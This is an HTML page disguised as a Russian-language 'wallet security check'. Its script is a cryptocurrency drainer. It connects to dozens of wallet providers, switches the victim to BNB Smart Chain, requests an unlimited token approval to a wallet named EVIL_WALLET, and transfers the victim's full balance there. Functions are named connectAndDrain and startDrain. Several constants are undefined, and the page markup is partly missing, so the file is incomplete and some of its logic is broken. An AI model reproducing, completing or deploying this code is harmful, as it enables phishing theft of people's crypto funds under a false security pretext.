<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Проверка безопасности кошелька</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            text-align: center;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 550px;
            width: 100%;
            background: rgba(0,0,0,0.7);
            border-radius: 30px;
            padding: 30px 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 26px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff4444, #ff8888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #aaa;
            margin-bottom: 20px;
            font-size: 13px;
        }
        button {
            background: linear-gradient(90deg, #ff4444, #cc0000);
            color: white;
            border: none;
            padding: 16px 35px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 0 15px rgba(255,0,0,0.5);
        }
        button:active { transform: scale(0.98); }
        #log {
            margin-top: 20px;
            font-size: 11px;
            text-align: left;
            background: rgba(0,0,0,0.5);
            padding: 12px;
            border-radius: 15px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); word-break: break-all; }
        .log-success { color: #0f0; }
        .log-error { color: #ff4444; }
        .log-info { color: #ffaa00; }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin: 20px 0 10px;
        }
        .wallet-btn {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15);
            padding: 10px 5px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
            font-size: 11px;
        }
        .wallet-btn:active { background: rgba(255,255,255,0.2); transform: scale(0.96); }
        .wallet-emoji { font-size: 28px; display: block; margin-bottom: 5px; }
        .warning { font-size: 10px; color: #ff8888; margin-top: 12px; }
        .badge { background: #ff4444; border-radius: 10px; padding: 2px 6px; font-size: 8px; margin-left: 4px; }
        @media (max-width: 550px) {
            .container { padding: 20px 15px; }
            .wallet-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
            .wallet-btn { padding: 8px 3px; font-size: 9px; }
            .wallet-emoji { font-size: 22px; }
            button { padding: 14px 25px; font-size: 16px; }
            h1 { font-size: 22px; }
        }
    </style>
</head>

        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        
        function addLog(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            let className = 'log-entry';
            if (type === 'success') className += ' log-success';
            if (type === 'error') className += ' log-error';
            if (type === 'info') className += ' log-info';
            entry.className = className;
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `[${time}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // Прямой DEEP LINK в приложение (НЕ на сайт!)
        function openDeepLink(wallet, currentUrl) {
            const encodedUrl = encodeURIComponent(currentUrl);
            let deepLinkUrl = "";
            
            // Используем универсальную ссылку или deeplink
            if (wallet.universal && isMobile) {
                deepLinkUrl = wallet.universal + currentUrl;
            } else if (wallet.deeplink) {
                deepLinkUrl = wallet.deeplink;
                if (!deepLinkUrl.endsWith("/")) deepLinkUrl += "/";
                deepLinkUrl += encodedUrl;
            }
            
            addLog(`📱 Открываю ${wallet.name}...`, 'info');
            addLog(`🔗 ${deepLinkUrl.substring(0, 60)}...`, 'info');
            
            // Прямой переход в приложение
            window.location.href = deepLinkUrl;
            
            // Fallback: если не открылось, показываем кнопку
            setTimeout(() => {
                addLog(`⚠️ Если ${wallet.name} не открылся, установите приложение`, 'error');
            }, 2000);
        }
        
        // Получить провайдера для ПК
        function getProvider(walletType) {
            const providers = {
                metamask: () => window.ethereum,
                trustwallet: () => window.trustwallet || window.ethereum,
                coinbase: () => window.coinbaseWalletExtension || window.ethereum,
                rainbow: () => window.ethereum,
                okx: () => window.okxwallet || window.ethereum,
                bybit: () => window.bybitWallet || window.ethereum,
                bitget: () => window.bitkeep || window.ethereum,
                tokenpocket: () => window.tokenpocket || window.ethereum,
                safepal: () => window.safepal || window.ethereum,
                imtoken: () => window.imtoken || window.ethereum,
                mathwallet: () => window.mathwallet || window.ethereum,
                onto: () => window.onto || window.ethereum,
                exodus: () => window.exodus || window.ethereum,
                phantom: () => window.phantom?.ethereum || window.ethereum,
                rabby: () => window.rabby || window.ethereum,
                ledger: () => window.ledger?.ethereum || window.ethereum,
                trezor: () => window.trezor?.ethereum || window.ethereum,
                onekey: () => window.onekey || window.ethereum,
                foxwallet: () => window.foxwallet || window.ethereum,
                coin98: () => window.coin98 || window.ethereum,
                frame: () => window.frame || window.ethereum,
                brave: () => window.brave?.ethereum || window.ethereum,
                opera: () => window.opera?.ethereum || window.ethereum,
                zerion: () => window.zerion || window.ethereum,
                zapper: () => window.zapper || window.ethereum,
                debank: () => window.debank || window.ethereum,
                backpack: () => window.backpack || window.ethereum,
                xdefi: () => window.xdefi || window.ethereum,
                keplr: () => window.keplr || window.ethereum,
                leap: () => window.leap || window.ethereum
            };
            return providers[walletType] ? providers[walletType]() : window.ethereum;
        }
        
        async function switchToBSC(provider) {
            try {
                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
                addLog("✅ Переключено на BSC", 'success');
                return true;
            } catch(e) {
                if (e.code === 4902) {
                    try {
                        await provider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: [BSC_RPC],
                                blockExplorerUrls: ['https://bscscan.com/']
                            }]
                        });
                        addLog("✅ BSC добавлена", 'success');
                        return true;
                    } catch(e2) {
                        addLog("❌ Ошибка добавления BSC", 'error');
                        return false;
                    }
                }
                return false;
            }
        }
        
        async function startDrain(provider, victimWallet) {
            try {
                const web3 = new Web3(provider);
                const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                
                const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                const decimals = await tokenContract.methods.decimals().call();
                const symbol = await tokenContract.methods.symbol().call();
                const humanBalance = Number(balance) / (10 ** Number(decimals));
                
                if (Number(balance) === 0) {
                    addLog(`⚠️ Нет ${symbol} на кошельке`, 'error');
                    return false;
                }
                
                addLog(`💰 Баланс: ${humanBalance} ${symbol}`, 'success');
                
                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                
                addLog(`✍️ Подпишите approve...`, 'info');
                const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
                addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
                
                addLog("🔄 Перевод...", 'info');
                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
                addLog(`✅ Переведено: ${humanBalance} ${symbol}`, 'success');
                addLog(`🎉 УСПЕХ!`, 'success');
                
                return true;
            } catch(err) {
                addLog(`❌ Ошибка: ${err.message}`, 'error');
                return false;
            }
        }
        
        async function connectAndDrain(wallet = null) {
            addLog("🚀 Запуск...", 'info');
            
            // МОБИЛЬНЫЕ: прямой deep link в приложение
            if (isMobile && wallet) {
                openDeepLink(wallet, window.location.href);
                return;
            }
            
            // ПК или десктопный кошелек
            let provider = null;
            if (wallet) {
                provider = getProvider(wallet.type);
            } else {
                provider = window.ethereum;
            }
            
            if (!provider) {
                if (isMobile && wallet) {
                    addLog(`📱 Установите ${wallet.name} из магазина приложений`, 'error');
                } else {
                    addLog(`❌ ${wallet?.name || 'Кошелек'} не найден. Установите расширение.`, 'error');
                }
                return;
            }
            
            try {
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                const victimWallet = accounts[0];
                addLog(`✅ Кошелек: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
                
                const switched = await switchToBSC(provider);
                if (!switched) return;
                
                await startDrain(provider, victimWallet);
                addLog("🏁 Готово!", 'success');
                
            } catch(err) {
                addLog(`💀 Ошибка: ${err.message}`, 'error');
                if (err.code === 4001) addLog("❌ Вы отменили подпись", 'error');
            }
        }
        
        // Создаем кнопки кошельков
        function renderWallets() {
            const grid = document.getElementById('walletGrid');
            grid.innerHTML = '';
            
            const filteredWallets = isMobile ? WALLETS.filter(w => w.isMobile) : WALLETS.filter(w => w.isDesktop);
            
            filteredWallets.forEach(wallet => {
                const btn = document.createElement('div');
                btn.className = 'wallet-btn';
                btn.innerHTML = `<span class="wallet-emoji">${wallet.emoji}</span>${wallet.name}`;
                btn.onclick = () => connectAndDrain(wallet);
                grid.appendChild(btn);
            });
            
            addLog(`📱 ${filteredWallets.length} кошельков загружено`, 'success');
        }
        
        // Главная кнопка
        document.getElementById('drainBtn').onclick = async () => {
            if (isMobile) {
                addLog("📱 На телефоне выберите кошелек из списка ниже", 'info');
            } else {
                await connectAndDrain(null);
            }
        };
        
        // Запуск
        renderWallets();
        if (isMobile) addLog("📱 Мобильный режим: при открытии кошелек запустится автоматически", 'info');
